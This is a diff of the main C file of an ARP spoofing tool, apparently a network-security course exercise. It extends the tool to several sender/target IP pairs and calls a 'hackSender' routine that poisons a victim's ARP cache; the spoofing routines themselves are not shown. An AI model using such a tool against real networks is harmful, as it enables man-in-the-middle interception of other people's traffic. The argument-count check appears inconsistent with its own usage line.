@@ -5,12 +5,12 @@
 #include "module.h"
 
 void usage() {
-  printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
-  printf("sample: ex : send_arp wlan0 192.168.10.2 192.168.10.1\n");
+  printf("syntax: arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
+  printf("sample: ex : arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
 }
 
 int main(int argc, char* argv[]) {
-  if (argc != 4) {
+  if (argc%2 != 0) {
     usage();
     return -1;
   }
@@ -24,18 +24,19 @@ int main(int argc, char* argv[]) {
     return -1;
   }
 
-  uint8_t * sender_ip = parseIP(argv[2]);
-  uint8_t * target_ip = parseIP(argv[3]);
+  uint8_t sender_ip[4], target_ip[4], attacker_ip[4];
+  parseIP(sender_ip, argv[2]);
+  parseIP(target_ip, argv[3]);
   printf("Sender ip : %s", printIPAddress(sender_ip));
   printf("Target ip : %s", printIPAddress(target_ip));
 
-  uint8_t * attaker_ip = parseIP(getAttackerIPAddress(dev));
-  printf("Attaker ip : %s\n", printIPAddress(attaker_ip));
+  parseIP(attacker_ip, getAttackerIPAddress(dev));
+  printf("Attaker ip : %s\n", printIPAddress(attacker_ip));
 
   u_char * attacker_mac_address = getAttackerMacAddress(dev);
   printf("Attacker Mac Address : %s", printMacAddress(attacker_mac_address));
 
-  u_char * sender_mac_address = getSenderMacAddress(handle, attacker_mac_address, attaker_ip, sender_ip);
+  u_char * sender_mac_address = getSenderMacAddress(handle, attacker_mac_address, attacker_ip, sender_ip);
   printf("Sender Mac Address : %s", printMacAddress(sender_mac_address));
 
   hackSender(handle, attacker_mac_address, sender_mac_address, target_ip, sender_ip);
